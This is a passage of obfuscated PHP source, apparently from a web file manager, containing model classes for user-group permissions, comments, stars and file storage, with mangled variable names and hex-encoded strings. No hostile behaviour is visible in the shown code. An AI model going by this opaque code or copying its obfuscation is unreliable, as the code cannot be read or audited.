$²Ñ·”ğÇ; $¹‰ºæú = $ßÒÄÍ¤É; $óãËÍ = LNG($ûšÜ—‰Ü[2190]); } else { if ($Ë¹ˆ•Ù) { $ç€ˆ²åÜ = $®õÈˆ¼; $¹‰ºæú = $½ıÑëĞš; $¨³ñé£Ô = Model($ûšÜ—‰Ü[587])->getInfo($àµœ³); $óãËÍ = $ûšÜ—‰Ü[176] . $¨³ñé£Ô[$ûšÜ—‰Ü[591]] . $ûšÜ—‰Ü[2191] . LNG($ûšÜ—‰Ü[2192]); } else { if ($¦ÕÑïşø) { $ç€ˆ²åÜ = $õ¤òÑ×; $¹‰ºæú = $ÓÌ²Ê£•; $óãËÍ = LNG($ûšÜ—‰Ü[2162]); } else { $ç€ˆ²åÜ = 0; $¹‰ºæú = !1; $óãËÍ = $ûšÜ—‰Ü[12]; } } } $á¡Ñ™Ì  = array($ûšÜ—‰Ü[2182] => intval($ç€ˆ²åÜ), $ûšÜ—‰Ü[2165] => $¹‰ºæú, $ûšÜ—‰Ü[2183] => $óãËÍ, $ûšÜ—‰Ü[2174] => $Úº®¨Ü‡[$ûšÜ—‰Ü[193]]); return $á¡Ñ™Ì ; } private function groupContainUser($ùÃ·©¯Ñ, $îšî©· = false) { return in_array($ùÃ·©¯Ñ, $this->userGroupParents($îšî©·)); } private function groupStepToUserGroup($ùÑí§‚’, $°Öœ£”» = false) { $²ªôªä¢ =& $_SERVER[Š—Â“œÔ]; $©‘èÌÖ = $this->userGroupList($°Öœ£”»); $Õã™è¢é = 1000; $ã³Âüåş = $GLOBALS[$²ªôªä¢[6]][$²ªôªä¢[92]][$²ªôªä¢[2078]] == 1; $†¸ªÃ÷Å = $ã³Âüåş ? 3 : 2; foreach ($©‘èÌÖ as $©™‘ï°Å) { if ($©™‘ï°Å[$²ªôªä¢[1971]] == $ùÑí§‚’) { return 0; } $½™®ÑÁç = explode($²ªôªä¢[50], trim($©™‘ï°Å[$²ªôªä¢[586]], $²ªôªä¢[50])); if ($½™®ÑÁç[0] == $²ªôªä¢[230] && count($½™®ÑÁç) > $†¸ªÃ÷Å) { $Ñ†‘Ó°¯ = array_reverse(array_slice($½™®ÑÁç, $†¸ªÃ÷Å)); $±ö®†² = array_search($ùÑí§‚’, $Ñ†‘Ó°¯); if ($±ö®†² !== !1 && $±ö®†² + 1 <= $Õã™è¢é) { $Õã™è¢é = $±ö®†² + 1; } } } return $Õã™è¢é; } private function userGroupList($‰ğÏÜÌ = false) { $Æøíîøû =& $_SERVER[Š—Â“œÔ]; static $öóŠÛ¢ = array(); if (isset($öóŠÛ¢[$‰ğÏÜÌ])) { return $öóŠÛ¢[$‰ğÏÜÌ]; } $‰½ûÚšî = Model($Æøíîøû[599])->getInfo($‰ğÏÜÌ); $öóŠÛ¢[$‰ğÏÜÌ] = array_to_keyvalue($‰½ûÚšî[$Æøíîøû[2163]], $Æøíîøû[1971]); return $öóŠÛ¢[$‰ğÏÜÌ]; } public function userGroupParents($ ôâ®£˜) { $ŞÍ¹ƒÔ… =& $_SERVER[Š—Â“œÔ]; static $‡‚Ò˜† = array(); $ ôâ®£˜ = $ ôâ®£˜ ? $ ôâ®£˜ : USER_ID; if (isset($‡‚Ò˜†[$ ôâ®£˜])) { return $‡‚Ò˜†[$ ôâ®£˜]; } $âïÊ…µä = $this->userGroupList($ ôâ®£˜); $Áé­ñí = array(); $±ªÃŸæ¥ = $GLOBALS[$ŞÍ¹ƒÔ…[6]][$ŞÍ¹ƒÔ…[92]][$ŞÍ¹ƒÔ…[2078]] == 1; $¬á„Ë¼ = $±ªÃŸæ¥ ? 3 : 2; foreach ($âïÊ…µä as $­†—–†Ø) { $üÙËÑ = array($­†—–†Ø[$ŞÍ¹ƒÔ…[1971]]); $˜ˆ¬ë¿ = explode($ŞÍ¹ƒÔ…[50], trim($­†—–†Ø[$ŞÍ¹ƒÔ…[586]], $ŞÍ¹ƒÔ…[50])); if ($˜ˆ¬ë¿[0] == $ŞÍ¹ƒÔ…[230] && count($˜ˆ¬ë¿) > $¬á„Ë¼) { $ö“ï»×ù = array_slice($˜ˆ¬ë¿, $¬á„Ë¼); $üÙËÑ = array_merge($üÙËÑ, array_reverse($ö“ï»×ù)); } $Áé­ñí = array_merge($Áé­ñí, $üÙËÑ); } $‡‚Ò˜†[$ ôâ®£˜] = array_unique($Áé­ñí); return $‡‚Ò˜†[$ ôâ®£˜]; } public function authTargetInfoMake($—ıöÛˆÅ) { $Á¡¼çõó =& $_SERVER[Š—Â“œÔ]; $‘Ä³ô‚§ = array(); $ßªŞ•ş¢ = array(); foreach ($—ıöÛˆÅ as $÷Æ‰Äí) { if ($÷Æ‰Äí[$Á¡¼çõó[190]] == SourceModel::TYPE_USER) { $‘Ä³ô‚§[] = intval($÷Æ‰Äí[$Á¡¼çõó[571]]); } else { if ($÷Æ‰Äí[$Á¡¼çõó[190]] == SourceModel::TYPE_GROUP) { $ßªŞ•ş¢[] = intval($÷Æ‰Äí[$Á¡¼çõó[571]]); } } } if ($‘Ä³ô‚§) { $‘Ä³ô‚§ = Model($Á¡¼çõó[579])->userListInfo($‘Ä³ô‚§); } if ($ßªŞ•ş¢) { $İ±½‚·ª = array($Á¡¼çõó[2063] => array($Á¡¼çõó[494], $ßªŞ•ş¢)); $ßªŞ•ş¢ = Model($Á¡¼çõó[587])->field($Á¡¼çõó[2193])->where($İ±½‚·ª)->select(); $ßªŞ•ş¢ = array_to_keyvalue($ßªŞ•ş¢, $Á¡¼çõó[1971]); } return array($Á¡¼çõó[2194] => $‘Ä³ô‚§, $Á¡¼çõó[2195] => $ßªŞ•ş¢); } public function authInfo($’›Ûß”ß) { $‡Æô¡×° =& $_SERVER[Š—Â“œÔ]; if ($’›Ûß”ß[$‡Æô¡×°[2079]]) { $Ëš Ûğë = Model($‡Æô¡×°[573])->listData($’›Ûß”ß[$‡Æô¡×°[2079]]); if (!$Ëš Ûğë) { return !1; $µ‰¨ß»“ = Model($‡Æô¡×°[573])->listData(); $©òï‚ÈÃ = array_filter_by_field($µ‰¨ß»“, $‡Æô¡×°[489], $‡Æô¡×°[230]); return $©òï‚ÈÃ; } $Èù‹°Ê = array_field_key($Ëš Ûğë, array($‡Æô¡×°[477], $‡Æô¡×°[32], $‡Æô¡×°[489], $‡Æô¡×°[1994], $‡Æô¡×°[1995])); $Èù‹°Ê[$‡Æô¡×°[2196]] = $’›Ûß”ß; return $Èù‹°Ê; } else { return array($‡Æô¡×°[495] => 0, $‡Æô¡×°[1977] => $’›Ûß”ß[$‡Æô¡×°[2140]], $‡Æô¡×°[496] => $‡Æô¡×°[12], $‡Æô¡×°[1994] => $‡Æô¡×°[2197]); } } } goto aÓÏŠÕ£…; b£Å£¼î‘Ü: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\145\156\164"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\143\x6f\x6d\x6d\x65\156\x74\x5f\x6d\x65\164\141", "\155\145\x74\141\106\151\145\x6c\144" => "\143\x6f\155\155\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Î—›ûÈÈ) { $òìĞò¸ =& $_SERVER[Š—Â“œÔ]; if ($Î—›ûÈÈ[$òìĞò¸[2000]]) { $”³éÃ¼ = $this->where(array($òìĞò¸[2001] => $Î—›ûÈÈ[$òìĞò¸[2000]]))->find(); if (!$”³éÃ¼ || $”³éÃ¼[$òìĞò¸[190]] != $Î—›ûÈÈ[$òìĞò¸[190]] || $”³éÃ¼[$òìĞò¸[571]] != $Î—›ûÈÈ[$òìĞò¸[571]]) { return !1; } $this->where(array($òìĞò¸[2001] => $Î—›ûÈÈ[$òìĞò¸[2000]]))->setAdd($òìĞò¸[2002], 1); } $Î—›ûÈÈ[$òìĞò¸[2003]] = 0; $Î—›ûÈÈ[$òìĞò¸[2002]] = 0; $Î—›ûÈÈ[$òìĞò¸[817]] = 1; return $this->add($Î—›ûÈÈ); } public function commentCount($Ò×‚ö¿, $×â©ğå , $ÚŞ£‹ß° = false) { $›ö• =& $_SERVER[Š—Â“œÔ]; if (!$Ò×‚ö¿) { return array(); } if (is_string($Ò×‚ö¿) || is_int($Ò×‚ö¿)) { $Ò×‚ö¿ = array($Ò×‚ö¿); } $åÆ³ôÛ£ = array($›ö•[571], $›ö•[2004] => $›ö•[567]); $îÓ¼×Á¤ = array($›ö•[571] => array($›ö•[7], $Ò×‚ö¿), $›ö•[190] => $×â©ğå ); if ($ÚŞ£‹ß°) { $îÓ¼×Á¤[$›ö•[1770]] = $ÚŞ£‹ß°; } $œçµáØÄ = $this->field($åÆ³ôÛ£)->where($îÓ¼×Á¤)->group($›ö•[571])->select(); return array_to_keyvalue($œçµáØÄ, $›ö•[571], $›ö•[567]); } public function starTarget($ø³Ï“ã¼, $»…£˜) { $”ÏçÂ¾ =& $_SERVER[Š—Â“œÔ]; $£’¿›†Ğ = $ø³Ï“ã¼ + self::TYPE_STAR_OFFSET; $´¿Õ´å = array($”ÏçÂ¾[1770] => USER_ID, $”ÏçÂ¾[190] => $£’¿›†Ğ, $”ÏçÂ¾[571] => $»…£˜); $á’ÔÕ¶ù = $this->where($´¿Õ´å)->find(); if ($á’ÔÕ¶ù) { return $this->where(array($”ÏçÂ¾[477] => $á’ÔÕ¶ù[$”ÏçÂ¾[477]]))->delete(); } $÷ÜöšúÉ = array($”ÏçÂ¾[2000] => 0, $”ÏçÂ¾[1770] => USER_ID, $”ÏçÂ¾[817] => 1, $”ÏçÂ¾[171] => $”ÏçÂ¾[12], $”ÏçÂ¾[190] => $£’¿›†Ğ, $”ÏçÂ¾[571] => $»…£˜, $”ÏçÂ¾[2003] => 0, $”ÏçÂ¾[2002] => 0); return $this->add($÷ÜöšúÉ); } public function starTargetCount($ÀÆ‚‡‚ˆ, $™­®­ı) { $Ò‘®”Ôî =& $_SERVER[Š—Â“œÔ]; $Ø°İ¼Ø = $™­®­ı + self::TYPE_STAR_OFFSET; $â˜Î´ˆ² = $this->commentCount($ÀÆ‚‡‚ˆ, $Ø°İ¼Ø); $ùØ³†×Ó = $this->commentCount($ÀÆ‚‡‚ˆ, $Ø°İ¼Ø, USER_ID); return array($Ò‘®”Ôî[2005] => $â˜Î´ˆ², $Ò‘®”Ôî[2006] => $ùØ³†×Ó); } public function starTargetUserList($ñö¸ïÃ¸, $”Èä¼€¦) { $å¿Ñ”îø =& $_SERVER[Š—Â“œÔ]; $åØ‘ÆëÇ = $ñö¸ïÃ¸ + self::TYPE_STAR_OFFSET; $‡ë¡áÁ = array($å¿Ñ”îø[571] => $”Èä¼€¦, $å¿Ñ”îø[190] => $åØ‘ÆëÇ); $ı†ä³”Ÿ = $this->where($‡ë¡áÁ)->count(); $÷Î‡º¤ = array($å¿Ñ”îø[334] => $ı†ä³”Ÿ, $å¿Ñ”îø[2007] => array()); if (!$ı†ä³”Ÿ) { return $÷Î‡º¤; } $ãÍùŠÕí = $this->field($å¿Ñ”îø[1770])->where($‡ë¡áÁ)->limit(500)->select(); $ãÍùŠÕí = array_to_keyvalue($ãÍùŠÕí, $å¿Ñ”îø[12], $å¿Ñ”îø[1770]); $÷Î‡º¤[$å¿Ñ”îø[2007]] = Model($å¿Ñ”îø[579])->userListInfo($ãÍùŠÕí); return $÷Î‡º¤; } public function prasiseUserList($şÑ÷ø¡ï) { $Û©İòÑ® =& $_SERVER[Š—Â“œÔ]; $Œş¡¿†ı = array($Û©İòÑ®[2008] => $şÑ÷ø¡ï); $É¸Ê§Õ„ = $this->where($Œş¡¿†ı)->find(); $Ô¾ÎÊ°ê = _get($É¸Ê§Õ„, $Û©İòÑ®[2003], 0); $ÔšªğøŠ = array($Û©İòÑ®[334] => $Ô¾ÎÊ°ê, $Û©İòÑ®[2007] => array()); if (!$Ô¾ÎÊ°ê) { return $ÔšªğøŠ; } $Ÿ¿¤¥õ³ = Model($Û©İòÑ®[2009])->field($Û©İòÑ®[1770])->where($Œş¡¿†ı)->limit(500)->select(); $Ÿ¿¤¥õ³ = array_to_keyvalue($Ÿ¿¤¥õ³, $Û©İòÑ®[12], $Û©İòÑ®[1770]); $ÔšªğøŠ[$Û©İòÑ®[2007]] = Model($Û©İòÑ®[579])->userListInfo($Ÿ¿¤¥õ³); return $ÔšªğøŠ; } public function remove($öÓûĞ…) { $€Ô¯îü¬ =& $_SERVER[Š—Â“œÔ]; $Í¦ó·ÁÏ = array($€Ô¯îü¬[2001] => $öÓûĞ…); $Üüé‡ƒ = $this->where($Í¦ó·ÁÏ)->find(); if ($Üüé‡ƒ[$€Ô¯îü¬[2000]]) { $this->where(array($€Ô¯îü¬[2001] => $Üüé‡ƒ[$€Ô¯îü¬[2000]]))->setAdd($€Ô¯îü¬[2002], -1); } return $this->where($Í¦ó·ÁÏ)->delete(); } public function edit($‚†ÖöİÔ, $Úñ„²£€) { $ƒÈóâÙ =& $_SERVER[Š—Â“œÔ]; $“¼ÜÖŸ = array($ƒÈóâÙ[2001] => $‚†ÖöİÔ); return $this->where($“¼ÜÖŸ)->save(array($ƒÈóâÙ[2010] => $Úñ„²£€)); } public function prasise($ºÔ‹¡³) { $ŞÒ‚ïåÍ =& $_SERVER[Š—Â“œÔ]; $µËõÃŸ = Model($ŞÒ‚ïåÍ[2011]); $­ıëºÖÚ = array($ŞÒ‚ïåÍ[2001] => $ºÔ‹¡³, $ŞÒ‚ïåÍ[1761] => USER_ID); $‹¿¬œÕµ = $µËõÃŸ->where($­ıëºÖÚ)->find(); if (!$‹¿¬œÕµ) { $µËõÃŸ->add($­ıëºÖÚ); $ĞÉ«¦» = $this->where(array($ŞÒ‚ïåÍ[2001] => $ºÔ‹¡³))->setAdd($ŞÒ‚ïåÍ[2003], 1); } else { $µËõÃŸ->where($­ıëºÖÚ)->delete(); $ĞÉ«¦» = $this->where(array($ŞÒ‚ïåÍ[2001] => $ºÔ‹¡³))->setAdd($ŞÒ‚ïåÍ[2003], -1); } return $ĞÉ«¦»; } public function targetInfo($ÙŸŸÆ‘, $›ëî˜®§) { $ŸÄÚ‹Ş˜ =& $_SERVER[Š—Â“œÔ]; $÷“ÊÃˆ = array($ŸÄÚ‹Ş˜[653] => $ÙŸŸÆ‘, $ŸÄÚ‹Ş˜[654] => $›ëî˜®§); $ä‹¶èô‚ = $this->where($÷“ÊÃˆ)->count(); $»Â·‘Ü´ = "\x52\111\107\x48\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x63\157\155\155\x65\x6e\x74\137\160\x72\141\x69\x73\145\x20\x73\x74\x61\162\x20\x6f\x6e\x20\x63\x6f\x6d\x6d\145\x6e\x74\56\143\x6f\x6d\155\145\x6e\164\111\104\x20\x3d\x20\163\x74\141\162\56\x63\x6f\155\155\145\x6e\x74\111\104"; $Åö˜ûÉ» = $this->alias($ŸÄÚ‹Ş˜[431])->where($÷“ÊÃˆ)->join($»Â·‘Ü´, $ŸÄÚ‹Ş˜[2012])->count(); $º”ñö˜ = array($ŸÄÚ‹Ş˜[2013] => $ä‹¶èô‚, $ŸÄÚ‹Ş˜[2014] => $Åö˜ûÉ»); return $º”ñö˜; } public function listData($­ÎÜÒıù) { $·ëåÄï =& $_SERVER[Š—Â“œÔ]; if (isset($­ÎÜÒıù[$·ëåÄï[2015]])) { if ($­ÎÜÒıù[$·ëåÄï[2015]]) { $­ÎÜÒıù[$·ëåÄï[2008]] = array($·ëåÄï[1088], intval($­ÎÜÒıù[$·ëåÄï[2015]])); } unset($­ÎÜÒıù[$·ëåÄï[2015]]); } if (isset($­ÎÜÒıù[$·ëåÄï[2016]])) { if ($­ÎÜÒıù[$·ëåÄï[2016]]) { $­ÎÜÒıù[$·ëåÄï[2008]] = array($·ëåÄï[1085], intval($­ÎÜÒıù[$·ëåÄï[2016]])); } unset($­ÎÜÒıù[$·ëåÄï[2016]]); } return $this->_listData($­ÎÜÒıù); } private function _listData($œİõ¹ÀÚ) { $çû°½ï =& $_SERVER[Š—Â“œÔ]; $ôÆÅ¹ = $this->where($œİõ¹ÀÚ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ôÆÅ¹[$çû°½ï[447]]); $this->_listAppendUser($ôÆÅ¹[$çû°½ï[447]]); $this->_listAppendMeta($ôÆÅ¹[$çû°½ï[447]]); return $ôÆÅ¹; } private function _makeOrder() { $Êƒ™Ô =& $_SERVER[Š—Â“œÔ]; $ËïªÓåÁ = array($Êƒ™Ô[2003], $Êƒ™Ô[2002], $Êƒ™Ô[233]); $ÕÔû¹‰ğ = Input::get($Êƒ™Ô[532], $Êƒ™Ô[7], $Êƒ™Ô[499], $ËïªÓåÁ); $«¹ÄöÁ = Input::get($Êƒ™Ô[533], $Êƒ™Ô[7], $Êƒ™Ô[1763], array($Êƒ™Ô[2017], $Êƒ™Ô[528])); $í‡İÓúƒ = $ÕÔû¹‰ğ . $Êƒ™Ô[53] . $«¹ÄöÁ; return $this->order($í‡İÓúƒ); } private function _listAppendParent(&$° ƒ îå) { $âòÚáº =& $_SERVER[Š—Â“œÔ]; $ˆó™‚¦ú = array_unique(array_to_keyvalue($° ƒ îå, $âòÚáº[12], $âòÚáº[2000])); $ˆó™‚¦ú = array_remove_value($ˆó™‚¦ú, $âòÚáº[230]); if (!$ˆó™‚¦ú) { return; } $¦ş¼û”¨ = $this->where(array($âòÚáº[2001] => array($âòÚáº[7], $ˆó™‚¦ú)))->select(); $¦ş¼û”¨ = array_to_keyvalue($¦ş¼û”¨, $âòÚáº[2008]); foreach ($° ƒ îå as &$Êâ¬«Ò) { if (isset($¦ş¼û”¨[$Êâ¬«Ò[$âòÚáº[2000]]])) { $Êâ¬«Ò[$âòÚáº[2018]] = $¦ş¼û”¨[$Êâ¬«Ò[$âòÚáº[2000]]]; } } unset($Êâ¬«Ò); } private function _listAppendUser(&$åÓ¬¨Ç«) { $öƒ åø÷ =& $_SERVER[Š—Â“œÔ]; $ù›ûâ = array_unique(array_to_keyvalue($åÓ¬¨Ç«, $öƒ åø÷[12], $öƒ åø÷[1770])); $ù›ûâ = array_remove_value($ù›ûâ, $öƒ åø÷[230]); if (count($ù›ûâ) == 0) { return; } foreach ($åÓ¬¨Ç« as $´Û“î…¿) { if (isset($´Û“î…¿[$öƒ åø÷[2018]])) { $ù›ûâ[] = $´Û“î…¿[$öƒ åø÷[2018]][$öƒ åø÷[1770]]; } } $åİÊ‚£ = Model($öƒ åø÷[599])->userListInfo($ù›ûâ); foreach ($åÓ¬¨Ç« as &$´Û“î…¿) { $´Û“î…¿[$öƒ åø÷[667]] = $åİÊ‚£[$´Û“î…¿[$öƒ åø÷[1770]]]; if (isset($´Û“î…¿[$öƒ åø÷[2018]])) { $´Û“î…¿[$öƒ åø÷[2018]][$öƒ åø÷[667]] = $åİÊ‚£[$´Û“î…¿[$öƒ åø÷[2018]][$öƒ åø÷[1770]]]; } } unset($´Û“î…¿); } private function _listAppendMeta(&$åàüß«) { $àœ¢¸É¤ =& $_SERVER[Š—Â“œÔ]; $‰—Ÿ¤¯Í = array_unique(array_to_keyvalue($åàüß«, $àœ¢¸É¤[12], $àœ¢¸É¤[2008])); $‰—Ÿ¤¯Í = array_remove_value($‰—Ÿ¤¯Í, $àœ¢¸É¤[230]); if (!$‰—Ÿ¤¯Í) { return; } foreach ($åàüß« as $÷å‘Ì†Ã) { if (isset($÷å‘Ì†Ã[$àœ¢¸É¤[2018]])) { $‰—Ÿ¤¯Í[] = $÷å‘Ì†Ã[$àœ¢¸É¤[2018]][$àœ¢¸É¤[2008]]; } } $ÅìèŸ™¿ = $this->metaList($‰—Ÿ¤¯Í); if (!$ÅìèŸ™¿) { return !1; } foreach ($åàüß« as &$÷å‘Ì†Ã) { $÷å‘Ì†Ã[$àœ¢¸É¤[541]] = $ÅìèŸ™¿[$÷å‘Ì†Ã[$àœ¢¸É¤[2008]]]; if (isset($÷å‘Ì†Ã[$àœ¢¸É¤[2018]])) { $÷å‘Ì†Ã[$àœ¢¸É¤[2018]][$àœ¢¸É¤[541]] = $ÅìèŸ™¿[$÷å‘Ì†Ã[$àœ¢¸É¤[2018]][$àœ¢¸É¤[2008]]]; } } unset($÷å‘Ì†Ã); } private function metaList($İÜ­ÒŞ˜) { $›ıÉÓÕŞ =& $_SERVER[Š—Â“œÔ]; if (!$İÜ­ÒŞ˜) { return array(); } $‹ß¬ñ»À = array($›ıÉÓÕŞ[2008] => array($›ıÉÓÕŞ[7], $İÜ­ÒŞ˜)); $Æ´šøÖ¯ = Model($›ıÉÓÕŞ[2019])->where($‹ß¬ñ»À)->select(); $Æ´šøÖ¯ = array_to_keyvalue_group($Æ´šøÖ¯, $›ıÉÓÕŞ[2008]); foreach ($Æ´šøÖ¯ as $û¾’Ü¦« => $¦·ÏéÍ€) { $¿ö óğÇ = array(); foreach ($¦·ÏéÍ€ as $ıñ„¨Ìº) { $¿ö óğÇ[$ıñ„¨Ìº[$›ıÉÓÕŞ[97]]] = $ıñ„¨Ìº[$›ıÉÓÕŞ[452]]; } $Æ´šøÖ¯[$û¾’Ü¦«] = $¿ö óğÇ; } return $Æ´šøÖ¯ ? $Æ´šøÖ¯ : array(); } public function removeTarget($ç¢“ˆ¥Ì, $¾ëŸúûÚ) { $Ğ·„‹ÊÙ =& $_SERVER[Š—Â“œÔ]; if (!$¾ëŸúûÚ) { return !0; } $¾ëŸúûÚ = is_array($¾ëŸúûÚ) ? $¾ëŸúûÚ : array($¾ëŸúûÚ); $ìŞ„ÍÄ = array($Ğ·„‹ÊÙ[190] => $ç¢“ˆ¥Ì, $Ğ·„‹ÊÙ[571] => array($Ğ·„‹ÊÙ[7], $¾ëŸúûÚ)); $Ñı©ã¥ = $this->field($Ğ·„‹ÊÙ[2008])->where($ìŞ„ÍÄ)->select(); $êçúÅ­ñ = array_to_keyvalue($Ñı©ã¥, $Ğ·„‹ÊÙ[12], $Ğ·„‹ÊÙ[2008]); if (!$êçúÅ­ñ) { return !0; } $ìŞ„ÍÄ = array($Ğ·„‹ÊÙ[2008] => array($Ğ·„‹ÊÙ[7], $êçúÅ­ñ)); $this->where($ìŞ„ÍÄ)->delete(); Model($Ğ·„‹ÊÙ[2011])->where($ìŞ„ÍÄ)->delete(); Model($Ğ·„‹ÊÙ[2020])->where($ìŞ„ÍÄ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\145\x5f\x63\157\x6e\164\145\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\155\145" => "\x69\157\x5f\x66\151\154\145\x5f\155\145\x74\x61", "\155\145\x74\141\x46\x69\x65\x6c\x64" => "\146\x69\x6c\145\x49\x44"); public function fileInfo($¼•âŸ¢ï) { $ÈÓåƒÁÕ =& $_SERVER[Š—Â“œÔ]; static $ˆë¾ÕŞá = array(); if (!isset($ˆë¾ÕŞá[$¼•âŸ¢ï])) { $Ûô–Í¾Ó = $ÈÓåƒÁÕ[2021]; $ò‚ˆÖğ = Model($ÈÓåƒÁÕ[546])->field($Ûô–Í¾Ó)->where(array($ÈÓåƒÁÕ[544] => $¼•âŸ¢ï))->find(); $ˆë¾ÕŞá[$¼•âŸ¢ï] = $ò‚ˆÖğ; } return $ˆë¾ÕŞá[$¼•âŸ¢ï]; } public function addFileByContent($©ØÊ¨Ã¿ = '', $¶ëïÒö« = '') { $ÉğßÍ¡œ =& $_SERVER[Š—Â“œÔ]; $×¾ÜôÌÙ = TEMP_PATH . $ÉğßÍ¡œ[2022]; if (!is_dir($×¾ÜôÌÙ)) { mk_dir($×¾ÜôÌÙ); } $°ùéçûï = $×¾ÜôÌÙ . $ÉğßÍ¡œ[2023] . rand_string(16); file_put_contents($°ùéçûï, $©ØÊ¨Ã¿); $áŠª°¦Ş = $this->addFile($°ùéçûï, $¶ëïÒö«, !0); if (file_exists($°ùéçûï)) { @unlink($°ùéçûï); } return $áŠª°¦Ş; } public function createFileName($Ö¦´Èùš, $µº‰õ = false, $ç¶é«¬› = false) { $ış³ŠÕ =& $_SERVER[Š—Â“œÔ]; $úı‚¾ùŠ = IO::init($ış³ŠÕ[8]); $‹İÒ®œÇ = $this->makeFilePath($Ö¦´Èùš, $úı‚¾ùŠ, $µº‰õ, $ç¶é«¬›); $ÄßôşÕÉ = $úı‚¾ùŠ->pathFather($‹İÒ®œÇ); static $Ş¥–¹¦ = false; $–º¼ª¾‰ = $ış³ŠÕ[2024] . md5($ÄßôşÕÉ); if (!$Ş¥–¹¦ && !Cache::get($–º¼ª¾‰)) { $Ş¥–¹¦ = !0; $ƒÈûÎ = IO::mkdir($ÄßôşÕÉ); if (!IO::exist($ƒÈûÎ . $ış³ŠÕ[865])) { IO::mkfile($ƒÈûÎ . $ış³ŠÕ[865]); } Cache::set($–º¼ª¾‰, 1, 3600 * 2); } return $‹İÒ®œÇ; } public function makeFilePath($à¬²¶¸Ç, $Ê¡Éàõ², $­ÕÒƒ · = false, $¢ˆŠå—ñ = false) { $ñ½Àïøè =& $_SERVER[Š—Â“œÔ]; $ŠÍ½¸¹ = Model($ñ½Àïøè[837])->get($ñ½Àïøè[2025]); $‹›àä”Ú = KodIO::defaultIO() . date($ñ½Àïøè[2026]); $“â†ìò² = $‹›àä”Ú . rand_string(5) . short_id(100); $à¬²¶¸Ç = str_replace($ñ½Àïøè[8], $ñ½Àïøè[11], KodIO::clear($à¬²¶¸Ç)); $Â›œƒÚ• = $Ê¡Éàõ²->ext($à¬²¶¸Ç); if (!$à¬²¶¸Ç) { $ŠÍ½¸¹ = $ñ½Àïøè[843]; } switch ($ŠÍ½¸¹) { case $ñ½Àïøè[2027]: if ($Â›œƒÚ•) { $“â†ìò² = $“â†ìò² . $ñ½Àïøè[10] . $Â›œƒÚ•; } if ($Â›œƒÚ• == $ñ½Àïøè[1963]) { $“â†ìò² .= $ñ½Àïøè[1288]; } break; case $ñ½Àïøè[2028]: $ÈğÏ÷åÌ = Model($ñ½Àïøè[837])->get($ñ½Àïøè[838]); $äŒ¢è÷Ø = substr(md5($ñ½Àïøè[839] . $ÈğÏ÷åÌ . date($ñ½Àïøè[816])), 0, 8); $ÀÍûØºå = KodIO::defaultDriver(); $‹›àä”Ú = $ñ½Àïøè[1320] . $ÀÍûØºå[$ñ½Àïøè[477]] . $ñ½Àïøè[486] . date($ñ½Àïøè[2029]) . $äŒ¢è÷Ø . $ñ½Àïøè[8]; if ($Â›œƒÚ• == $ñ½Àïøè[1963]) { $à¬²¶¸Ç .= $ñ½Àïøè[1288]; } $å–­›í˜ = $ñ½Àïøè[2030] . $‹›àä”Ú . $à¬²¶¸Ç; CacheLock::lock($å–­›í˜); $“â†ìò² = $‹›àä”Ú . $à¬²¶¸Ç; if (IO::exist($‹›àä”Ú . $à¬²¶¸Ç)) { $‹Äƒã = substr($à¬²¶¸Ç, 0, strlen($à¬²¶¸Ç) - strlen($Â›œƒÚ•)); $¸‘°ó—ß = $¢ˆŠå—ñ ? substr($¢ˆŠå—ñ, 0, 5) : ($­ÕÒƒ · ? substr($­ÕÒƒ ·, 0, 5) : rand_string(5)); $“â†ìò² = $‹›àä”Ú . $‹Äƒã . $¸‘°ó—ß; if ($Â›œƒÚ•) { $“â†ìò² = $“â†ìò² . $ñ½Àïøè[10] . $Â›œƒÚ•; } } if (IO::isOsDriver($“â†ìò²) && !IO::isUploadServer($“â†ìò²)) { if (IO::exist($“â†ìò²)) { CacheLock::unlock($å–­›í˜); return $“â†ìò²; } $÷şÑ¶”ª = IO::setContent($“â†ìò², $ñ½Àïøè[12]); if (!$÷şÑ¶”ª) { show_json($ñ½Àïøè[2031], !1); } } CacheLock::unlock($å–­›í˜); break; case $ñ½Àïøè[843]: break; default: break; } return $“â†ìò²; } public function addFileByRemote($Îá®º, $²ˆÅ›Ø¬, $ûÛøÄ¹Ó = array()) { $’İ§µîÇ =& $_SERVER[Š—Â“œÔ]; if (!IO::exist($Îá®º)) { return !1; } $ö¥Ñâ¼ = $ûÛøÄ¹Ó[$’İ§µîÇ[549]] ? $ûÛøÄ¹Ó[$’İ§µîÇ[549]] : $’İ§µîÇ[12]; $ê…ó•‹Û = IO::hashMd5($Îá®º, $ö¥Ñâ¼); $‘àşã§ = KodIO::defaultDriver(); $Ãâı’²¤ = array($’İ§µîÇ[622] => IO::size($Îá®º), $’İ§µîÇ[2032] => 1, $’İ§µîÇ[496] => $²ˆÅ›Ø¬, $’İ§µîÇ[876] => $‘àşã§[$’İ§µîÇ[477]], $’İ§µîÇ[497] => $Îá®º, $’İ§µîÇ[2033] => $ûÛøÄ¹Ó[$’İ§µîÇ[677]] ? $ûÛøÄ¹Ó[$’İ§µîÇ[677]] : IO::hashSimple($Îá®º), $’İ§µîÇ[2034] => $ê…ó•‹Û ? $ê…ó•‹Û : $ö¥Ñâ¼); if ($šøşÑ·ë = $this->addFileCheckExist($Ãâı’²¤[$’İ§µîÇ[677]], $Ãâı’²¤[$’İ§µîÇ[549]], $Ãâı’²¤[$’İ§µîÇ[79]])) { return $šøşÑ·ë; } return $this->addFileData($Ãâı’²¤); } private function addFileData($È¸¯à–¼) { $©íá…° =& $_SERVER[Š—Â“œÔ]; if (!$È¸¯à–¼) { return !1; } $È¸¯à–¼[$©íá…°[79]] = 